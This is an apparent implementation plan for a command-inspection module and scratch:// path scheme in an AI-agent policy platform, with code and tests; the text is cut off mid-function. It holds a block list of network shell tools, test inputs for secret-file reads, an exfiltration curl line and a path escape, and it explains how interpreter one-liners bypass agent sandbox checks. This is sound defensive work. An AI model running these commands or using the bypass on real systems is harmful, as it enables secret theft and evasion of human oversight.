# Secure Scratch Pad Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

> **OUTCOME UPDATE (post-implementation):** Task 3 (`terminal.run_scratch`,
> unattended command execution) was implemented, security-reviewed twice, and
> ultimately **reverted**. The path-confinement approach used to sandbox it
> (deny file arguments outside `REPO_ROOT`/`SCRATCH_ROOT`) could not contain a
> general interpreter (`python3 -c`/`perl -e`/`ruby -e`/`node -e`/`awk`)
> computing its own file path or performing network I/O at runtime — this
> defeats both the path-deny and network-egress checks simultaneously with no
> human in the loop, which would have broken the platform's "no network
> egress by default" invariant. Closing that gap needs OS-level sandboxing
> (`sandbox-exec`/namespaces/seccomp) or restricting the tool to a
> non-interpreter executable allow-list — both larger changes than this
> plan's scope. The user decided to descope: `terminal.run`'s existing
> human-approval gate remains the only path for arbitrary command execution.
> **What actually shipped from this plan: Tasks 1-2 only** —
> `security/command_inspector.py` (shared parsing logic, used today by the
> existing native-tool hook) and the `scratch://` read/write/list filesystem
> scheme (no execution surface, so none of the interpreter-bypass concerns
> apply to it). The steps below are left as originally written for the
> historical record of what was attempted and why it didn't ship, except
> where later steps (Task 5/6) have been updated in-place to describe the
> final, actually-shipped state.

**Goal (as originally scoped):** Let agents run unattended (no human-approval)
shell commands in a per-repo scratch directory, while mechanically preventing
the commands from reading denied paths (`.env`, `secrets/**`, `.ssh/**`,
etc.), leaking secret material in their output, or reaching the network
beyond what the repo's tier already allows. **See the outcome update above —
this goal was not achieved safely and the execution tool was reverted.**

**Architecture (as originally scoped, Task 3 later reverted):** Extract the
Bash-command-parsing/policy logic that `hooks/policy_hook.py` already has for
Claude Code's native Bash tool into a new shared module
`security/command_inspector.py` (shipped). Add a `scratch://` path scheme to
the `filesystem-policy` MCP server, resolving to
`$CLAUDE_ENV_HOME/scratch/<repo_name>/` (shipped). Add a new
`terminal.run_scratch` MCP tool that reuses the existing no-shell
command-chaining engine (`_tokenize`/`_split_pipelines`/`_run_pipeline` in
`mcp-servers/terminal/server.py`) but skips the human-approval gate, wrapping
it in a pre-execution path/egress check (Layer 1, via `command_inspector`)
and a post-execution secret-redaction pass over stdout/stderr (Layer 2, via
`PolicyEngine.scan_content()`) — **implemented, security-reviewed, found
unsafe against interpreter-based bypass, and reverted; not shipped.**
Add a TTL-based reaper in `bootstrap.py` as a cleanup backstop (shipped —
useful regardless of Task 3's outcome, since the scratch:// filesystem scheme
still creates directories that need cleanup).

**Tech Stack:** Python 3.13, pytest, the existing `security.policy_engine.PolicyEngine`
(specifically `scan_content()`), `audit.audit_logger.AuditLogger`, the `mcp`
SDK's low-level `Server`/`stdio_server` (no network, stdio transport only).

## Global Constraints

- Never commit to `master` — this work happens on the already-checked-out
  branch `feat/secure-scratchpad`. Confirm the branch before every commit
  (`git branch --show-current`), as a separate step from `git commit`.
- After every file change under `security/`, `hooks/`, `mcp-servers/`, or
  `bootstrap.py`, copy the changed file(s) into `$CLAUDE_ENV_HOME`
  (`~/.claude-env`) — the live MCP servers run from there, not from the repo
  checkout. Use `cp -v <repo path> ~/.claude-env/<same relative path>` for a
  single file, or `python3 bootstrap.py --no-deps` to re-mirror everything.
- Run `pytest tests/ -q` after every task and confirm all tests pass
  (231 pass on `master` as of this plan; each task should only add tests, not
  break existing ones) before moving to the next task.
- Do not weaken any existing invariant: the existing `hooks/policy_hook.py`
  test suite (`tests/test_policy_hook_bash.py`,
  `tests/test_policy_hook_scope_egress.py`) must continue passing byte-for-byte
  unmodified after the extraction in Task 1 — this proves the native-tool hook's
  behavior did not regress.
- `terminal.run`'s existing approval-gated behavior is untouched by this plan
  (`terminal.run_scratch` was planned as purely additive, but was reverted —
  see the OUTCOME UPDATE above; `terminal.run` remains the only execution
  path, exactly as before this plan).
- Per the approved design (`docs/superpowers/specs/2026-07-12-secure-scratchpad-design.md`),
  scratch is scoped **per-repo** (keyed off `CLAUDE_ENV_REPO_NAME`), not
  per-session — `CLAUDE_ENV_SESSION` is not wired to a shared value across MCP
  server processes today, so per-session scoping is explicitly out of scope.
- Destructive commands (`rm`, `dd`, etc.) are NOT hard-denied inside scratch
  (unlike the native-tool hook) — a scratch pad's entire point is disposable
  work. They ARE still subject to the path-deny check (an `rm` targeting a
  denied path outside scratch is still refused).

---

### Task 1: Extract shared command-inspection logic into `security/command_inspector.py`

**Files:**
- Create: `security/command_inspector.py`
- Modify: `hooks/policy_hook.py:44-437` (imports + delete the now-duplicated
  functions/constants, keep everything hook-specific)
- Test: `tests/test_command_inspector.py` (new)
- Test: `tests/test_policy_hook_bash.py` (existing — must pass unmodified)
- Test: `tests/test_policy_hook_scope_egress.py` (existing — must pass unmodified)

**Interfaces:**
- Produces (used by Task 3):
  - `security.command_inspector.shell_tokens(command: str) -> list[str]`
  - `security.command_inspector.bash_candidates(command: str, cwd: str) -> tuple[list[str], set[str]]`
  - `security.command_inspector.bash_write_targets(command: str, cwd: str) -> list[str]`
  - `security.command_inspector.looks_like_path(tok: str) -> bool`
  - `security.command_inspector.FILE_CMDS: set[str]`
  - `security.command_inspector.NET_CMDS: set[str]`
  - `security.command_inspector.CMD_SEP: set[str]`
  - `security.command_inspector.REDIR: set[str]`
  - `security.command_inspector.CommandVerdict` — a `@dataclass` with fields
    `action: str` (`"deny"` or `"allow"`), `reason: str`, `denied_path: str`
  - `security.command_inspector.inspect_command(command: str, cwd: str, engine,
    root: Path | None = None, exempt_root: Path | None = None) -> CommandVerdict`
    — runs the path-deny + exfiltration + plain-egress precedence chain (NOT
    the control-plane guard, NOT inline-secret-in-command-string — those stay
    native-tool-specific in `policy_hook.py`). Destructive commands (`rm`,
    `dd`, etc.) are never denied purely for being destructive by this
    function — only their file arguments are checked against policy (the
    native-tool hook's separate `_mutating_reason` hard-deny is what makes
    Bash-tool destructive commands denied; `inspect_command` itself has no
    such rule, which is exactly what lets the scratch caller allow `rm` on
    its own files). `exempt_root`, when given, skips the policy-deny check
    (but NOT the exfiltration/egress checks) for any candidate path that
    resolves inside it — this is what makes scratch allow-all for its own
    files (per the design's decision 3) while still enforcing deny rules on
    anything a scratch command touches outside that directory.
- Consumes: nothing from other tasks (this is the foundation).

- [ ] **Step 1: Read the exact code being moved**

Confirm the byte-for-byte content of these regions in
`hooks/policy_hook.py` before touching anything (line numbers as of this
plan's writing; re-check if the file has since changed):
- `_FILE_CMDS`, `_NET_CMDS`, `_MUTATING_CMDS` (not moved — stays native-only),
  `_GIT_MUTATING` (not moved), `_CMD_SEP`, `_REDIR` (lines 168–200)
- `_looks_like_path` (203–205)
- `_shell_tokens` (208–223)
- `_bash_candidates` (226–275)
- `_WRITE_CMDS`, `_bash_write_targets` (278–324)
- `_inspect_bash` (352–437) — this one is NOT moved verbatim; its logic is
  split: the control-plane guard (`_bash_write_targets` + `_is_control_plane`
  block, lines 370–387) and the destructive-command hard-deny (`_mutating_reason`
  call, lines 359–366) and the inline-secret-in-command-string check (lines
  423–436) all stay in `policy_hook.py` since they are native-tool-specific
  policy calls (destructive commands ARE allowed in scratch; control-plane
  paths are about protecting the deployed platform from the native Write/Edit
  tools, orthogonal to scratch). What moves into `inspect_command()` is only:
  the path-deny loop (389–404), the exfiltration-combo check (406–410), and the
  plain-egress-tier check (412–421).

- [ ] **Step 2: Write `security/command_inspector.py`**

```python
"""
claude-env :: shared command-string inspection for policy enforcement.
File: security/command_inspector.py

Extracted from hooks/policy_hook.py so the SAME parsing + deny-check logic
protects both Claude Code's native Bash tool (via policy_hook.py, which still
owns the native-tool-specific control-plane guard, destructive-command hard
deny, and inline-secret-in-command-string check) and any other command runner
that needs to mechanically enforce policy on an unattended/unapproved command
string (see mcp-servers/terminal/server.py's terminal.run_scratch).

Parsing is deliberately conservative: a slashless bare token is only treated
as a candidate file path when it is an argument to a known file command AND
the path actually exists on disk, so grep patterns / subcommand names are
never mistaken for files under tier-3 default-deny.
"""
from __future__ import annotations

import os
import re
from dataclasses import dataclass
from pathlib import Path

import shlex

# Commands whose non-flag arguments are filesystem paths worth policy-checking.
FILE_CMDS = {
    "cat", "tac", "nl", "less", "more", "head", "tail", "sed", "awk", "cut",
    "sort", "uniq", "grep", "egrep", "fgrep", "rg", "ag", "strings", "xxd",
    "od", "hexdump", "base64", "gpg", "openssl", "cp", "mv", "tee", "dd", "ln",
    "install", "rsync", "scp", "shred", "truncate", "split", "wc", "file",
    "stat", "readlink", "realpath", "cmp", "diff", "md5", "md5sum", "sha1sum",
    "sha256sum", "gzip", "gunzip", "zip", "unzip", "tar",
}
# Commands that move data off the machine — network egress.
NET_CMDS = {
    "curl", "wget", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "ssh",
    "telnet", "ftp", "socat", "http", "https", "aws", "gcloud", "az",
}
# commands whose non-flag arguments name files they WRITE (last arg is the
# dest for cp/mv/install/ln; tee/dd write all their file args).
WRITE_CMDS = {"cp", "mv", "tee", "dd", "install", "ln", "rsync"}
# Shell tokens that separate one simple command from the next: command
# separators AND grouping/subshell delimiters, so `(rm -rf x)` / `{ rm x; }`
# don't hide `rm` behind the `(`/`{`.
CMD_SEP = {";", "|", "&", "&&", "||", "|&", "\n", "(", ")", "{", "}"}
# Redirection operators; the following token is a path being written/read.
REDIR = {">", ">>", "<", ">|", "&>", "&>>", "2>", "2>>", "1>", "1>>"}


def looks_like_path(tok: str) -> bool:
    """A token that is structurally a path (absolute, relative, home, dotfile)."""
    return ("/" in tok) or tok.startswith(("~", "."))


def shell_tokens(command: str) -> list[str]:
    """Tokenize a shell command, respecting quotes AND surfacing operators
    (`;` `|` `&` `&&` `||` `<` `>` `>>`) as their own tokens.

    `shlex.split()` does NOT split operators glued to a word, so `echo hi;rm x`
    tokenizes as `['echo', 'hi;rm', 'x']` — the `rm` is never seen as a command
    and downstream checks are silently bypassed. A shlex.shlex with
    punctuation_chars fixes that while still honoring quotes (so
    `echo "a;b"` keeps `a;b` intact)."""
    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = ""            # '#' is not a comment mid-command
        return list(lex)
    except ValueError:
        return [t for t in re.split(r"\s+", command) if t]


def bash_candidates(command: str, cwd: str) -> tuple[list[str], set[str]]:
    """Parse a Bash command into (candidate file paths, network-egress cmds).

    Conservative on purpose: a slashless bare token is only a candidate path
    when it is an argument to a file command AND exists on disk, so arbitrary
    args (grep patterns, subcommands like `git log`) are not mistaken for
    files under tier-3 default-deny.
    """
    tokens = shell_tokens(command)

    segments: list[list[str]] = [[]]
    for t in tokens:
        if t in CMD_SEP:
            segments.append([])
        else:
            segments[-1].append(t)

    paths: list[str] = []
    nets: set[str] = set()
    base = Path(cwd or ".")
    for seg in segments:
        if not seg:
            continue
        cmd = os.path.basename(seg[0])
        if cmd in NET_CMDS:
            nets.add(cmd)
        is_file_cmd = cmd in FILE_CMDS
        expect_target = False
        for tok in seg[1:]:
            if tok in REDIR:
                expect_target = True
                continue
            if expect_target:                      # `> file`
                paths.append(tok)
                expect_target = False
                continue
            m = re.match(r"^(?:\d*>>?|<)(.+)$", tok)  # `>file` / `2>file` glued
            if m:
                paths.append(m.group(1))
                continue
            if tok.startswith("-"):                # flag
                continue
            if re.match(r"^[a-z][a-z0-9+.\-]*://", tok):  # URL, not a local path
                continue
            if looks_like_path(tok):
                paths.append(tok)
            elif is_file_cmd and (base / tok).exists():
                paths.append(tok)
    return paths, nets


def bash_write_targets(command: str, cwd: str) -> list[str]:
    """File paths a Bash command WRITES to: redirection destinations (`>`/`>>`,
    glued or spaced) plus the target args of file-writing commands. Read-only
    args (cat/grep/sed -n/…) are deliberately excluded."""
    tokens = shell_tokens(command)
    segments: list[list[str]] = [[]]
    for t in tokens:
        (segments.append([]) if t in CMD_SEP else segments[-1].append(t))

    out: list[str] = []
    for seg in segments:
        if not seg:
            continue
        cmd = os.path.basename(seg[0])
        expect_target = False
        args_after: list[str] = []
        for tok in seg[1:]:
            if tok in REDIR:                        # `> file`
                expect_target = True
                continue
            if expect_target:
                out.append(tok)
                expect_target = False
                continue
            m = re.match(r"^(?:\d*>>?|>\|)(.+)$", tok)   # `>file` / `2>file` glued
            if m:
                out.append(m.group(1))
                continue
            if not tok.startswith("-"):
                args_after.append(tok)
        if cmd == "dd":
            out += [a.split("=", 1)[1] for a in args_after if a.startswith("of=")]
        elif cmd in WRITE_CMDS:
            if cmd == "tee":
                out += args_after
            elif args_after:
                out.append(args_after[-1])
    return out


@dataclass
class CommandVerdict:
    action: str          # "deny" or "allow"
    reason: str = ""
    denied_path: str = ""


def _rel_for_policy(path_str: str, root: Path) -> str:
    """Path as the policy engine expects: repo-relative when inside the repo,
    otherwise the absolute path with the leading '/' stripped so global
    '**/...' deny globs (e.g. **/.ssh/**) still match."""
    p = Path(os.path.expanduser(path_str))
    if not p.is_absolute():
        return str(p)
    try:
        return str(p.resolve().relative_to(root))
    except ValueError:
        return str(p.resolve()).lstrip("/")


def inspect_command(command: str, cwd: str, engine, root: Path | None = None,
                    exempt_root: Path | None = None) -> CommandVerdict:
    """Run the policy-deny + exfiltration + plain-egress precedence chain
    against a command string. Does NOT check for a native-tool control-plane
    write, destructive-command hard-deny, or inline secret-in-command-string —
    callers that need those (policy_hook.py's native Bash path) layer them on
    top; a caller that allows destructive commands by design (a scratch pad)
    can use this function as-is.

    `root` defaults to `Path(cwd)` when not given — the directory candidate
    paths are resolved relative to for policy evaluation.

    `exempt_root`, when given, skips the policy-deny check (step 1 below) for
    any candidate path that resolves inside it -- e.g. a scratch pad passes
    its own scratch directory here so an agent-created file like
    'notes.env' inside scratch isn't blocked purely by extension, while a
    path OUTSIDE exempt_root (a relative '../' escape, or an absolute path to
    the real repo) is still checked normally. The exfiltration/egress checks
    (steps 2-3) are NOT exempted -- a network command combined with ANY file
    argument, even one inside exempt_root, is still flagged.
    """
    root = root if root is not None else Path(cwd or ".")
    paths, nets = bash_candidates(command, cwd)

    # 1. any file argument the policy blocks -> deny (hard), unless it
    #    resolves inside exempt_root (a scratch pad's own directory).
    for tok in paths:
        abs_tok = tok if os.path.isabs(os.path.expanduser(tok)) \
            else str((Path(cwd or ".") / tok))
        if exempt_root is not None:
            try:
                resolved = Path(abs_tok).resolve()
                if resolved == exempt_root or exempt_root in resolved.parents:
                    continue
            except OSError:
                pass
        rel_tok = _rel_for_policy(abs_tok, root)
        decision = engine.evaluate_path(rel_tok)
        if decision.action == "block":
            return CommandVerdict(
                "deny",
                f"blocked by claude-env policy ({decision.reason}: "
                f"{decision.rule or tok}) — command touches a protected path",
                decision.rule or tok)

    # 2. network egress combined with a file argument -> likely exfiltration
    if nets and paths:
        return CommandVerdict(
            "deny",
            f"possible data exfiltration: network command "
            f"({', '.join(sorted(nets))}) with a file argument")

    # 3. plain network egress -> deny on tier>=2 (network disabled), else allow
    #    (the scratch caller decides what "ask" means for an unattended path;
    #    inspect_command only distinguishes deny vs allow, not ask — see
    #    terminal.run_scratch in Task 3 for how tier<=1 egress is surfaced).
    if nets:
        tier = getattr(engine.repo, "tier", 1)
        egress = ", ".join(sorted(nets))
        if tier >= 2:
            return CommandVerdict(
                "deny",
                f"network egress ({egress}) is not permitted in a tier-{tier} "
                f"repo — route through an approved channel")

    return CommandVerdict("allow")
```

- [ ] **Step 3: Update `hooks/policy_hook.py` to import from the shared module**

Replace the block at `hooks/policy_hook.py:167-275` (the `_FILE_CMDS`/`_NET_CMDS`/
`_CMD_SEP`/`_REDIR` constants, `_looks_like_path`, `_shell_tokens`,
`_bash_candidates`) and the `_WRITE_CMDS`/`_bash_write_targets` block at
`284-324` with imports:

```python
from security.command_inspector import (  # noqa: E402
    CMD_SEP, FILE_CMDS, NET_CMDS, REDIR, WRITE_CMDS,
    bash_candidates as _bash_candidates,
    bash_write_targets as _bash_write_targets,
    looks_like_path as _looks_like_path,
    shell_tokens as _shell_tokens,
)
```

Add this import near the top of the file, after the existing
`from lib.logging_setup import get_logger` try/except block (so it's close to
the other cross-module imports). Keep every other name in `policy_hook.py`
exactly as-is — `_MUTATING_CMDS`, `_GIT_MUTATING`, `_mutating_reason`,
`_inspect_bash`, `_is_control_plane`, `_CONTROL_PLANE`, `_mcp_first_hint`, etc.
are untouched (they reference `_bash_candidates`/`_bash_write_targets`, which
now resolve to the imported shared functions — no call-site changes needed
since the local names `_bash_candidates`/`_bash_write_targets`/`_looks_like_path`/
`_shell_tokens` are preserved via the `as` aliases).

Delete the old inline definitions of `_FILE_CMDS`, `_NET_CMDS`, `_CMD_SEP`,
`_REDIR`, `_looks_like_path`, `_shell_tokens`, `_bash_candidates`, `_WRITE_CMDS`,
`_bash_write_targets` from `policy_hook.py` (they now live only in
`command_inspector.py`).

- [ ] **Step 4: Run the existing hook test suite to confirm zero regression**

Run: `pytest tests/test_policy_hook_bash.py tests/test_policy_hook_scope_egress.py -v`
Expected: all tests PASS, identical to before the extraction (these tests
import `_bash_candidates`, `_inspect_bash`, `_looks_like_path`, `_mutating_reason`
directly from `hooks.policy_hook` — confirm those names still resolve after
the `as`-aliased imports).

- [ ] **Step 5: Write `tests/test_command_inspector.py`**

```python
"""Coverage for security/command_inspector.py — the shared command-string
parsing + policy-deny logic used by BOTH hooks/policy_hook.py (native Bash
tool) and mcp-servers/terminal/server.py (terminal.run_scratch). Run:
pytest tests/ -q

Regression context: this logic was extracted verbatim from
hooks/policy_hook.py so both callers share one parser instead of two that
could silently drift apart. inspect_command() intentionally omits the
native-tool-specific control-plane guard and destructive-command hard-deny —
callers that need those layer them on separately.
"""
import os
import sys
import tempfile
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_ROOT))

from security.command_inspector import (bash_candidates, inspect_command,
                                        looks_like_path)
from security.policy_engine import PolicyEngine


def _engine(tier: int = 1):
    d = tempfile.mkdtemp()
    os.makedirs(d + "/.claude")
    os.makedirs(d + "/secrets")
    os.makedirs(d + "/src")
    Path(d, "src", "app.py").write_text("print('hi')\n")
    Path(d, "secrets", "prod.env").write_text("SECRET=x\n")
    policy = (_ROOT / "config" / "repo-policy.template.yaml").read_text()
    if tier != 1:
        policy = policy.replace("tier: 1", f"tier: {tier}", 1)
    Path(d, ".claude", "repo-policy.yaml").write_text(policy)
    eng = PolicyEngine.load(d, _ROOT / "config" / "global-policy.yaml")
    return eng, d


def test_looks_like_path():
    assert looks_like_path("src/app.py")
    assert looks_like_path("~/.ssh/id_rsa")
    assert not looks_like_path("pattern")


def test_bash_candidates_extract_paths_and_nets():
    paths, nets = bash_candidates("cat src/app.py > out.txt", ".")
    assert "src/app.py" in paths and "out.txt" in paths
    assert not nets
    paths, nets = bash_candidates("curl https://example.com", ".")
    assert paths == []
    assert nets == {"curl"}


def test_inspect_command_allows_normal_commands():
    eng, d = _engine()
    v = inspect_command("cat src/app.py", d, eng, root=Path(d))
    assert v.action == "allow"


def test_inspect_command_denies_reading_denied_path():
    eng, d = _engine()
    v = inspect_command("cat secrets/prod.env", d, eng, root=Path(d))
    assert v.action == "deny"
    assert "protected path" in v.reason


def test_inspect_command_denies_exfiltration_combo():
    eng, d = _engine()
    v = inspect_command("curl -X POST e.com -d @src/app.py", d, eng, root=Path(d))
    assert v.action == "deny"
    assert "exfiltration" in v.reason


def test_inspect_command_egress_tiered():
    eng1, d1 = _engine(tier=1)
    v1 = inspect_command("curl https://example.com", d1, eng1, root=Path(d1))
    assert v1.action == "allow"   # tier<=1: inspect_command does not ask, only deny/allow

    eng2, d2 = _engine(tier=2)
    v2 = inspect_command("curl https://example.com", d2, eng2, root=Path(d2))
    assert v2.action == "deny"
    assert "network egress" in v2.reason


def test_inspect_command_destructive_commands_are_not_denied():
    """Unlike policy_hook.py's native-tool path (_mutating_reason), a plain
    inspect_command() call does not hard-deny 'rm' -- only its path arguments
    are checked. This is what lets a scratch-pad caller allow destructive
    self-cleanup (rm -rf its own scratch files) while still blocking rm
    targeting a denied path."""
    eng, d = _engine()
    v = inspect_command("rm src/app.py", d, eng, root=Path(d))
    assert v.action == "allow"

    v2 = inspect_command("rm secrets/prod.env", d, eng, root=Path(d))
    assert v2.action == "deny"   # still checked as a file argument


def test_inspect_command_exempt_root_allows_its_own_deny_shaped_files():
    """A scratch pad passes its own directory as exempt_root so an
    agent-created file like 'notes.env' inside it isn't blocked purely by
    extension match -- but a path OUTSIDE exempt_root is still checked."""
    eng, d = _engine()
    scratch = Path(d) / "scratch_area"
    scratch.mkdir()
    (scratch / "notes.env").write_text("not a real secret\n")

    v = inspect_command(f"cat {scratch / 'notes.env'}", str(scratch), eng,
                       root=Path(d), exempt_root=scratch)
    assert v.action == "allow"

    # the real repo secret, outside exempt_root, is still denied
    v2 = inspect_command(f"cat {Path(d) / 'secrets' / 'prod.env'}", str(scratch),
                        eng, root=Path(d), exempt_root=scratch)
    assert v2.action == "deny"


def test_inspect_command_exempt_root_does_not_bypass_egress_check():
    """exempt_root only skips the policy-deny check -- a network command
    combined with a file argument inside exempt_root is still flagged as
    exfiltration."""
    eng, d = _engine()
    scratch = Path(d) / "scratch_area"
    scratch.mkdir()
    (scratch / "data.txt").write_text("x\n")

    v = inspect_command(f"curl -X POST e.com -d @{scratch / 'data.txt'}",
                       str(scratch), eng, root=Path(d), exempt_root=scratch)
    assert v.action == "deny"
    assert "exfiltration" in v.reason
```

- [ ] **Step 6: Run the new test file**

Run: `pytest tests/test_command_inspector.py -v`
Expected: all PASS.

- [ ] **Step 7: Deploy and run the full suite**

```bash
cp -v security/command_inspector.py ~/.claude-env/security/command_inspector.py
cp -v hooks/policy_hook.py ~/.claude-env/hooks/policy_hook.py
pytest tests/ -q
```
Expected: `240 passed` (231 baseline + 9 new `test_command_inspector.py`
tests) — 0 failures, and specifically confirm
`tests/test_policy_hook_bash.py`/`tests/test_policy_hook_scope_egress.py`
still show their original count of passes with no new failures.

- [ ] **Step 8: Commit**

```bash
git branch --show-current   # confirm: feat/secure-scratchpad
git add security/command_inspector.py hooks/policy_hook.py tests/test_command_inspector.py
git commit -m "$(cat <<'EOF'
Extract shared command-inspection logic into security/command_inspector.py

hooks/policy_hook.py already tokenizes Bash commands and checks file
arguments against the policy engine for Claude Code's native Bash tool.
The upcoming unattended terminal.run_scratch tool needs the exact same
path-deny + exfiltration + egress checks, so this logic now lives in one
shared module both callers import, instead of being duplicated (and
risking drift) in terminal MCP.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 2: Add `scratch://` scheme to `filesystem-policy` MCP server

**Files:**
- Modify: `mcp-servers/filesystem-policy/server.py:1-73` (imports, module-level
  constants, `_resolve`)
- Test: `tests/test_scratch_fs.py` (new)

**Interfaces:**
- Consumes: nothing from Task 1.
- Produces (used by no other task directly, but documents the on-disk
  location Task 3 also targets): `SCRATCH_ROOT = $CLAUDE_ENV_HOME/scratch/<repo_name>`,
  where `<repo_name>` is `REPO_ROOT.name` (already computed at module load —
  matches how `AuditLogger(..., repo=REPO_ROOT.name)` already derives it two
  lines below).

- [ ] **Step 1: Write the failing test for scratch path resolution**

Create `tests/test_scratch_fs.py`:

```python
"""Coverage for the scratch:// path scheme in
mcp-servers/filesystem-policy/server.py. Run: pytest tests/ -q

Regression context: agents need a place to do disposable work (intermediate
files, downloaded artifacts) without every read/write being subject to the
full repo policy allow-list -- but the deny rules (secrets, .ssh, .env, etc.)
must still protect anything scratch commands touch OUTSIDE the scratch
directory. Scoped per-repo (CLAUDE_ENV_REPO_NAME), not per-session --
CLAUDE_ENV_SESSION is not wired to a shared value across MCP server
processes today (see docs/superpowers/specs/2026-07-12-secure-scratchpad-design.md
decision 1).
"""
import importlib.util
import os
import shutil
import sys
import tempfile
import types
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_ROOT))


def _load_server(repo_root: Path, home: Path):
    """Import mcp-servers/filesystem-policy/server.py against a fresh fake
    repo root and CLAUDE_ENV_HOME, with the mcp package stubbed out (this
    test only exercises path resolution, not the stdio protocol)."""
    os.environ["CLAUDE_ENV_REPO_ROOT"] = str(repo_root)
    os.environ["CLAUDE_ENV_HOME"] = str(home)
    os.environ["CLAUDE_ENV_GLOBAL_POLICY"] = str(_ROOT / "config" / "global-policy.yaml")

    sys.modules["mcp"] = types.ModuleType("mcp")
    mod_mcp_server = types.ModuleType("mcp.server")
    mod_mcp_server.Server = lambda name: types.SimpleNamespace(
        list_tools=lambda: (lambda f: f), call_tool=lambda: (lambda f: f))
    sys.modules["mcp.server"] = mod_mcp_server
    mod_mcp_stdio = types.ModuleType("mcp.server.stdio")
    mod_mcp_stdio.stdio_server = None
    sys.modules["mcp.server.stdio"] = mod_mcp_stdio
    mod_mcp_types = types.ModuleType("mcp.types")
    mod_mcp_types.TextContent = None
    mod_mcp_types.Tool = None
    sys.modules["mcp.types"] = mod_mcp_types

    spec = importlib.util.spec_from_file_location(
        "_fs_policy_server", _ROOT / "mcp-servers" / "filesystem-policy" / "server.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _repo(tmp_path: Path) -> Path:
    repo = tmp_path / "demo-repo"
    (repo / ".claude").mkdir(parents=True)
    (repo / ".claude" / "repo-policy.yaml").write_text(
        (_ROOT / "config" / "repo-policy.template.yaml").read_text())
    return repo


def test_scratch_path_resolves_under_claude_env_home_scratch(tmp_path):
    repo = _repo(tmp_path)
    home = tmp_path / "home"
    srv = _load_server(repo, home)

    rel, abs_path = srv._resolve("scratch://notes.txt")
    assert abs_path == home / "scratch" / "demo-repo" / "notes.txt"


def test_scratch_path_escape_is_rejected(tmp_path):
    repo = _repo(tmp_path)
    home = tmp_path / "home"
    srv = _load_server(repo, home)

    import pytest
    with pytest.raises(srv.PolicyBlocked):
        srv._resolve("scratch://../../etc/passwd")


def test_ordinary_repo_path_unaffected_by_scratch_scheme(tmp_path):
    repo = _repo(tmp_path)
    home = tmp_path / "home"
    srv = _load_server(repo, home)

    rel, abs_path = srv._resolve("src/app.py")
    assert abs_path == repo / "src" / "app.py"


def test_scratch_dir_is_wiped_and_recreated_on_start(tmp_path):
    repo = _repo(tmp_path)
    home = tmp_path / "home"
    scratch_dir = home / "scratch" / "demo-repo"
    scratch_dir.mkdir(parents=True)
    (scratch_dir / "stale.txt").write_text("leftover from a previous session\n")

    srv = _load_server(repo, home)
    srv._reset_scratch_dir()

    assert scratch_dir.is_dir()
    assert not (scratch_dir / "stale.txt").exists()
```

- [ ] **Step 2: Run it to confirm it fails**

Run: `pytest tests/test_scratch_fs.py -v`
Expected: FAIL — `srv._resolve("scratch://notes.txt")` does not yet branch on
the `scratch://` prefix (returns a path under `repo`, not `home/scratch/...`),
and `_reset_scratch_dir` does not exist yet.

- [ ] **Step 3: Implement the scratch scheme in `mcp-servers/filesystem-policy/server.py`**

Modify the top of the file. Current lines 48-73:

```python
REPO_ROOT = Path(os.environ.get("CLAUDE_ENV_REPO_ROOT", os.getcwd())).resolve()
GLOBAL_POLICY = os.environ.get(
    "CLAUDE_ENV_GLOBAL_POLICY", str(_HOME / "config" / "global-policy.yaml"))
SESSION_ID = os.environ.get("CLAUDE_ENV_SESSION", "mcp-fs")
MAX_READ_BYTES = int(os.environ.get("CLAUDE_ENV_MAX_READ_BYTES", str(2_000_000)))

_engine = PolicyEngine.load(REPO_ROOT, GLOBAL_POLICY)
_audit = AuditLogger(session_id=SESSION_ID, actor="filesystem-policy",
                     repo=REPO_ROOT.name, tier=_engine.repo.tier)

server = Server("filesystem-policy")


# --- path safety -------------------------------------------------------------
class PolicyBlocked(Exception):
    pass


def _resolve(rel_path: str) -> tuple[str, Path]:
    """Resolve a repo-relative path, rejecting escapes. Returns (rel, abs)."""
    candidate = (REPO_ROOT / rel_path).resolve()
    try:
        rel = candidate.relative_to(REPO_ROOT)
    except ValueError:
        raise PolicyBlocked(f"path escapes repo root: {rel_path}")
    return str(rel).replace("\\", "/"), candidate
```

Replace with:

```python
REPO_ROOT = Path(os.environ.get("CLAUDE_ENV_REPO_ROOT", os.getcwd())).resolve()
GLOBAL_POLICY = os.environ.get(
    "CLAUDE_ENV_GLOBAL_POLICY", str(_HOME / "config" / "global-policy.yaml"))
SESSION_ID = os.environ.get("CLAUDE_ENV_SESSION", "mcp-fs")
MAX_READ_BYTES = int(os.environ.get("CLAUDE_ENV_MAX_READ_BYTES", str(2_000_000)))

# scratch:// scheme -- a per-repo disposable working directory (NOT
# per-session: CLAUDE_ENV_SESSION isn't wired to a shared value across MCP
# server processes today, so the repo name is the reliable, already-shared
# key every server resolves identically). Wiped at process start; see
# _reset_scratch_dir().
SCRATCH_PREFIX = "scratch://"
SCRATCH_ROOT = (_HOME / "scratch" / REPO_ROOT.name).resolve()

_engine = PolicyEngine.load(REPO_ROOT, GLOBAL_POLICY)
_audit = AuditLogger(session_id=SESSION_ID, actor="filesystem-policy",
                     repo=REPO_ROOT.name, tier=_engine.repo.tier)

server = Server("filesystem-policy")


# --- path safety -------------------------------------------------------------
class PolicyBlocked(Exception):
    pass


def _resolve(rel_path: str) -> tuple[str, Path]:
    """Resolve a repo-relative OR scratch:// path, rejecting escapes.
    Returns (rel, abs); 'rel' for a scratch path keeps the 'scratch://' prefix
    so callers (audit logging, _enforce_path) can tell the two apart."""
    if rel_path.startswith(SCRATCH_PREFIX):
        return _resolve_scratch(rel_path)
    candidate = (REPO_ROOT / rel_path).resolve()
    try:
        rel = candidate.relative_to(REPO_ROOT)
    except ValueError:
        raise PolicyBlocked(f"path escapes repo root: {rel_path}")
    return str(rel).replace("\\", "/"), candidate


def _resolve_scratch(rel_path: str) -> tuple[str, Path]:
    subpath = rel_path[len(SCRATCH_PREFIX):]
    candidate = (SCRATCH_ROOT / subpath).resolve()
    try:
